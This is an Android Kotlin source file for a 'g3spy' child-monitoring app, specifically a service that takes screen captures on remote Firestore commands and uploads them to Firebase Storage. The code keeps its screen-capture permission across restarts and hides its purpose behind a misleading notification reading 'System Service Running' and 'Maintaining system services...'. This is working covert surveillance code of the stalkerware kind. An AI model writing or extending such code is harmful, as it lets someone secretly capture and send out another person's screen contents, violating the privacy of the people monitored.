package com.g3spy.child.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.ComponentName
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.g3spy.child.util.NotificationChannelManager
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.storage.FirebaseStorage
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.util.*
import java.util.concurrent.Executors

/**
 * Service that takes screenshots and uploads them to Firebase Storage
 */
class ScreenshotService : Service() {
    companion object {
        private const val TAG = "ScreenshotService"
        private const val NOTIFICATION_ID = 1004
        private const val CHANNEL_ID = "screenshot_channel"
        private const val CHANNEL_NAME = "Screenshot Service"
        private const val PREF_NAME = "ScreenshotServicePrefs"
        private const val PROJECTION_RESULT_CODE = "projection_result_code"
        private const val PROJECTION_INTENT_DATA = "projection_intent_data"
    }
    
    private lateinit var firestore: FirebaseFirestore
    private lateinit var storage: FirebaseStorage
    private lateinit var prefs: SharedPreferences
    private var commandListener: ListenerRegistration? = null
    
    // Media projection variables
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var displayWidth = 0
    private var displayHeight = 0
    private var displayDensity = 0
    
    // Executor for background tasks
    private val executor = Executors.newSingleThreadExecutor()
    
    private val binder = LocalBinder()
    
    inner class LocalBinder : Binder() {
        fun getService(): ScreenshotService = this@ScreenshotService
    }
    
    override fun onCreate() {
        super.onCreate()
        
        firestore = FirebaseFirestore.getInstance()
        storage = FirebaseStorage.getInstance()
        prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        
        // Get display metrics
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        windowManager.defaultDisplay.getMetrics(metrics)
        displayWidth = metrics.widthPixels
        displayHeight = metrics.heightPixels
        displayDensity = metrics.densityDpi
        
        // Create the notification channel
        NotificationChannelManager.createNotificationChannel(
            this,
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        )
        
        // Try to restore media projection
        restoreMediaProjection()
        
        // Listen for commands
        listenForScreenshotCommands()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "ScreenshotService started")
        
        // Save projection data if provided
        if (intent?.hasExtra("resultCode") == true && intent.hasExtra("data")) {
            val resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
            val data = intent.getParcelableExtra<Intent>("data")
            
            if (resultCode != Activity.RESULT_CANCELED && data != null) {
                // Save for later restoration
                with(prefs.edit()) {
                    putInt(PROJECTION_RESULT_CODE, resultCode)
                    putString(PROJECTION_INTENT_DATA, data.toUri(0))
                    apply()
                }
                
                // Initialize projection
                initializeMediaProjection(resultCode, data)
            }
        }
        
        // Create a notification for the foreground service
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder {
        return binder
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopMediaProjection()
        commandListener?.remove()
        executor.shutdown()
    }
    
    private fun createNotification(): Notification {
        // Create an intent that will open the app when tapped
        val notificationIntent = Intent(this, this::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        // Build the notification
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Running")
            .setContentText("Maintaining system services...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun restoreMediaProjection() {
        val resultCode = prefs.getInt(PROJECTION_RESULT_CODE, Activity.RESULT_CANCELED)
        val dataString = prefs.getString(PROJECTION_INTENT_DATA, null)
        
        if (resultCode != Activity.RESULT_CANCELED && dataString != null) {
            try {
                val data = Intent.parseUri(dataString, 0)
                initializeMediaProjection(resultCode, data)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restore media projection", e)
            }
        }
    }
    
    private fun initializeMediaProjection(resultCode: Int, data: Intent) {
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, data)
        
        mediaProjection?.let { projection ->
            // Create an ImageReader to capture screenshots
            imageReader = ImageReader.newInstance(
                displayWidth,
                displayHeight,
                PixelFormat.RGBA_8888,
                2
            ).apply {
                setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    image?.let { processImage(it) }
                }, null)
            }
            
            // Create a virtual display to capture the screen
            virtualDisplay = projection.createVirtualDisplay(
                "ScreenshotDisplay",
                displayWidth,
                displayHeight,
                displayDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface,
                null,
                null
            )
            
            Log.d(TAG, "Media projection initialized")
        }
    }
    
    private fun stopMediaProjection() {
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        
        virtualDisplay = null
        imageReader = null
        mediaProjection = null
        
        Log.d(TAG, "Media projection stopped")
    }
    
    private fun listenForScreenshotCommands() {
        commandListener = firestore.collection("remote_commands")
            .whereEqualTo("command", "SCREENSHOT")
            .whereEqualTo("isExecuted", false)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen failed", e)
                    return@addSnapshotListener
                }
                
                snapshots?.documentChanges?.forEach { change ->
                    val command = change.document
                    Log.d(TAG, "Received screenshot command: ${command.id}")
                    
                    // Take a screenshot
                    takeScreenshot { success ->
                        if (success) {
                            // Mark the command as executed
                            command.reference.update("isExecuted", true)
                        }
                    }
                }
            }
    }
    
    private fun takeScreenshot(callback: (Boolean) -> Unit) {
        if (mediaProjection == null) {
            Log.e(TAG, "Cannot take screenshot: Media projection not initialized")
            callback(false)
            return
        }
        
        // Trigger a capture by invalidating the virtual display
        virtualDisplay?.let {
            Handler(Looper.getMainLooper()).postDelayed({
                Log.d(TAG, "Taking screenshot")
                // The callback will be called by the ImageReader's onImageAvailableListener
                callback(true)
            }, 500) // Slight delay to ensure the display is ready
        } ?: run {
            Log.e(TAG, "Virtual display not initialized")
            callback(false)
        }
    }
    
    private fun processImage(image: Image) {
        executor.execute {
            var bitmap: Bitmap? = null
            var outputStream: ByteArrayOutputStream? = null
            var fileOutputStream: FileOutputStream? = null
            var tempFile: File? = null
            
            try {
                val buffer = image.planes[0].buffer
                val pixelStride = image.planes[0].pixelStride
                val rowStride = image.planes[0].rowStride
                val rowPadding = rowStride - pixelStride * displayWidth
                
                // Create bitmap
                bitmap = Bitmap.createBitmap(
                    displayWidth + rowPadding / pixelStride,
                    displayHeight,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                
                // Create a temporary file
                tempFile = File.createTempFile("screenshot", ".jpg", cacheDir)
                fileOutputStream = FileOutputStream(tempFile)
                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, fileOutputStream)
                
                // Upload to Firebase
                uploadScreenshot(tempFile)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to process image", e)
            } finally {
                try {
                    outputStream?.close()
                    fileOutputStream?.close()
                    image.close()
                    bitmap?.recycle()
                } catch (e: IOException) {
                    Log.e(TAG, "Error closing resources", e)
                }
            }
        }
    }
    
    private fun uploadScreenshot(file: File) {
        // Get the currently active app
        val appInForeground = "Unknown" // In a real app, would get actual foreground app
        
        // Create a reference to Firebase Storage
        val timestamp = System.currentTimeMillis()
        val filename = "screenshot_${timestamp}.jpg"
        val storageRef = storage.reference.child("screenshots/$filename")
        
        // Upload the file
        val uploadTask = storageRef.putFile(Uri.fromFile(file))
        uploadTask.addOnSuccessListener {
            // Get the download URL
            storageRef.downloadUrl.addOnSuccessListener { uri ->
                // Save the screenshot metadata to Firestore
                val screenshotData = hashMapOf(
                    "imageUrl" to uri.toString(),
                    "timestamp" to Timestamp.now(),
                    "appInForeground" to appInForeground
                )
                
                firestore.collection("screenshots")
                    .add(screenshotData)
                    .addOnSuccessListener { documentReference ->
                        Log.d(TAG, "Screenshot uploaded with ID: ${documentReference.id}")
                        
                        // Clean up the temporary file
                        file.delete()
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Error uploading screenshot metadata", e)
                    }
            }
        }.addOnFailureListener { e ->
            Log.e(TAG, "Error uploading screenshot", e)
            file.delete()
        }
    }
}